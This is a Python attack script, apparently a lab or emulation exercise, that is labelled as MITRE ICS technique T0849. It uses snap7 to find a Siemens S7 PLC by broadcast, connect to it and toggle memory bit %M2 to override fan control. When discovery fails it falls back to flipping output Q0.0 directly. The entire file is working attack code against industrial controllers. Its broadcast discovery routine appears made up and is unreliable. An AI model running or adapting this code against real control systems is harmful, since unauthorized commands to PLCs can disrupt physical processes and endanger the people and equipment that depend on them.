import snap7
import socket
import struct
import time

# Technique: Impair Process Control - Unauthorized Command Message (T0849)

# Configuration - Modify these based on your actual setup.

# 1.  PLC Configuration (Attempt to discover IP)
PLC_IP = None  # Initially None, will attempt discovery
RACK = 0
SLOT = 1

# Memory Bit to Toggle (Corresponds to M_TOG in the PLC code)
TOGGLE_MEMORY_ADDRESS = 2  # %M2
# Output Bit to Control Directly if IP discovery fails (Fallback)
OUTPUT_BIT_ADDRESS = 0  # Q0.0 Fan Output
OUTPUT_BYTE_ADDRESS = 0
# Initialize S7 Client
plc = snap7.client.Client()


def discover_plc_ip():
    """
    Attempts to discover the PLC IP address by broadcasting a discovery packet.
    This relies on the PLC responding to such broadcasts, which may not always be enabled.
    Returns:
        str: The discovered IP address, or None if discovery fails.
    """
    broadcast_address = '255.255.255.255'  # Standard broadcast address
    discovery_port = 1616  # Port used by Snap7 for discovery

    # Construct the discovery message
    message = b'\x00\x00\x00\x00\x00\x01\x00\x01'  # Minimal Snap7 discovery request

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcasting
    sock.settimeout(5)  # Timeout after 5 seconds

    try:
        # Send the broadcast message
        sock.sendto(message, (broadcast_address, discovery_port))
        print("Sent PLC discovery broadcast.")

        # Receive the response
        data, addr = sock.recvfrom(1024)  # Buffer size is 1024
        print("Received PLC discovery response from:", addr[0])
        return addr[0]  # Return the IP address

    except socket.timeout:
        print("PLC discovery timed out.  Ensure PLC is on the same network and responds to broadcasts.")
        return None
    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None
    finally:
        sock.close()



def write_memory_bit(plc_client, address, value):
    """Writes a boolean value to a specific memory bit in the PLC.

    Args:
        plc_client: The Snap7 client object.
        address (int): The memory bit address (e.g., 2 for %M2).
        value (bool): The boolean value to write (True or False).
    """
    byte_index = address // 8  # Determine the byte index
    bit_index = address % 8   # Determine the bit index within the byte

    # Read the existing byte
    read_data = plc_client.read_area(snap7.constants.Areas.MK, 0, byte_index, 1)  # Read 1 byte

    # Modify the specific bit within the byte
    original_byte = read_data[0]
    if value:
        modified_byte = original_byte | (1 << bit_index)  # Set the bit
    else:
        modified_byte = original_byte & ~(1 << bit_index) # Clear the bit

    # Write the modified byte back to the PLC
    write_data = bytearray([modified_byte]) # Convert the byte to a bytearray
    plc_client.write_area(snap7.constants.Areas.MK, 0, byte_index, write_data)

    print(f"Successfully wrote value {value} to memory bit %M{address}")

def write_output_bit(plc_client, byte_address, bit_address, value):
    """Writes a boolean value to a specific output bit in the PLC.  Used as fallback.

    Args:
        plc_client: The Snap7 client object.
        byte_address (int): The byte address of the output (e.g., 0 for %Q0.x).
        bit_address (int): The bit address within the byte (e.g., 0 for %Q0.0).
        value (bool): The boolean value to write (True or False).
    """

    # Read the existing byte
    read_data = plc_client.read_area(snap7.constants.Areas.PA, 0, byte_address, 1)

    # Modify the specific bit within the byte
    original_byte = read_data[0]
    if value:
        modified_byte = original_byte | (1 << bit_address)  # Set the bit
    else:
        modified_byte = original_byte & ~(1 << bit_address) # Clear the bit

    # Write the modified byte back to the PLC
    write_data = bytearray([modified_byte])
    plc_client.write_area(snap7.constants.Areas.PA, 0, byte_address, write_data)

    print(f"Successfully wrote value {value} to output bit %Q{byte_address}.{bit_address}")



def main():
    global PLC_IP  # Allow modification of the global variable

    # 1. PLC IP Discovery
    PLC_IP = discover_plc_ip()

    if PLC_IP is None:
        print("PLC IP discovery failed.  Please manually configure PLC_IP in the script or ensure PLC responds to discovery packets.")
        print("Falling back to direct output control (less reliable).")
    else:
         print(f"Discovered PLC IP: {PLC_IP}")


    # 2. Connect to PLC (Retry mechanism)
    max_retries = 3
    retry_delay = 5  # seconds
    connected = False

    for attempt in range(max_retries):
        try:
            plc.connect(PLC_IP or '127.0.0.1', RACK, SLOT)  # Connect.  Defaults to localhost if IP discovery failed.
            connected = True
            print(f"Connected to PLC at {PLC_IP or '127.0.0.1'} after {attempt + 1} attempt(s).")
            break  # Exit the loop if connected
        except Exception as e:
            print(f"Attempt {attempt + 1} failed to connect: {e}")
            if attempt < max_retries - 1:
                print(f"Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            else:
                print("Max connection attempts reached.  Exiting.")
                return  # Exit if connection fails after all retries


    if connected:

        # 3. Impair Process Control - Unauthorized Command Message

        try:

            # This section performs the "Unauthorized Command Message" action.
            # It toggles the M_TOG memory bit, which, according to the PLC logic,
            # can disable the fan control logic even when M_ACTFAN is active.
            # This is "unauthorized" because, under normal operation, the program
            # is likely expecting a different mechanism to control this behavior.
            # The script is directly manipulating a memory location to override the programmed logic.
            # Toggle the M_TOG bit

            if PLC_IP: #Use Memory Bit
                print("Attempting to impair process control by toggling M_TOG...")
                # First, read the current state of the M_TOG bit.
                read_data = plc.read_area(snap7.constants.Areas.MK, 0, TOGGLE_MEMORY_ADDRESS // 8, 1)
                current_byte = read_data[0]
                current_value = (current_byte >> (TOGGLE_MEMORY_ADDRESS % 8)) & 1  # Extract the bit value

                new_value = not current_value  # Toggle the bit

                write_memory_bit(plc, TOGGLE_MEMORY_ADDRESS, new_value)  # Write the toggled value
            else: #Use direct output control as fallback

                print("Attempting to impair process control by directly controlling the Q_FAN output (fallback)...")
                #Read current output state
                read_data = plc.read_area(snap7.constants.Areas.PA, 0, OUTPUT_BYTE_ADDRESS, 1)
                current_byte = read_data[0]
                current_value = (current_byte >> (OUTPUT_BIT_ADDRESS % 8)) & 1

                new_value = not current_value

                write_output_bit(plc, OUTPUT_BYTE_ADDRESS, OUTPUT_BIT_ADDRESS, new_value) # Write the toggled value



            print("Process control impairment attempt completed.")


        except Exception as e:
            print(f"Error during process control impairment: {e}")

        finally:
            # Disconnect from the PLC
            plc.disconnect()
            print("Disconnected from PLC.")
    else:
        print("Could not connect to the PLC.  Process control impairment attempt aborted.")



if __name__ == "__main__":
    main()